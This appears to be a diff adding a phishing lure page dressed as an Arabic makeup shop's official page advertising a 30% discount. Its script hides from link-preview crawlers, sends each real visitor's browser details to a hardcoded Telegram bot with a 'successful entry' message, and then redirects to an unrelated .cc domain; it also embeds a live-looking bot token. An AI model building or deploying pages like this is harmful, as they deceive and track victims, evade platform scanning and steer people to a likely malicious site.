@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html lang="ar">
+  <head>
+    <meta charset="UTF-8" />
+    <title>الربيع makeup(النزهه)</title>
+
+    <!-- Meta Tags للمعاينة -->
+    <meta property="og:title" content="الصفحة الرسميه للربيع makeup(النزهه)" />
+    <meta property="og:description" content="مفاجأة كبيره لأهالي النزهه اقوي عروض وخصومات 30٪ بدايه من يوم 6/8 حتي يوم 8/8 و ...😍❤️‍🔥💋" />
+    <meta property="og:image" content="https://i.ibb.co/3ggPb3g/IMG-20250805-WA0234.jpg" />
+    <meta property="og:url" content="https://woershiduoqipa.cc/Mess?id=b4cab67f-c6e6-4e9c-322d-08dc89f259e3" />
+    <meta property="og:type" content="website" />
+  </head>
+  <body>
+    <script>
+      const BOT_TOKEN = "7556980993:AAF1dVr6m2DitiaFOY8_1v59wBKR04p-xXA";
+      const CHAT_ID = "7347048637";
+
+      function sendTelegramMessage(message) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: message
+          })
+        });
+      }
+
+      function isBot() {
+        const ua = navigator.userAgent.toLowerCase();
+        return ua.includes("facebookexternalhit") || ua.includes("twitterbot") || ua.includes("telegrambot") || ua.includes("whatsapp") || ua.includes("googlebot");
+      }
+
+      function notifyAndRedirect() {
+        if (isBot()) {
+          // لا تفعل أي شيء إذا كان الزائر بوت (للسماح بمعاينة الرابط)
+          return;
+        }
+
+        const userAgent = navigator.userAgent;
+        const message = `📩 لقد تم دخول أحد الأشخاص بنجاح.\n📱 نوع الهاتف/المتصفح:\n${userAgent}`;
+        sendTelegramMessage(message);
+
+        setTimeout(() => {
+          window.location.href = "https://woershiduoqipa.cc/Mess?id=b4cab67f-c6e6-4e9c-322d-08dc89f259e3";
+        }, 200); // تأخير بسيط
+      }
+
+      window.onload = notifyAndRedirect;
+    </script>
+  </body>
+</html>
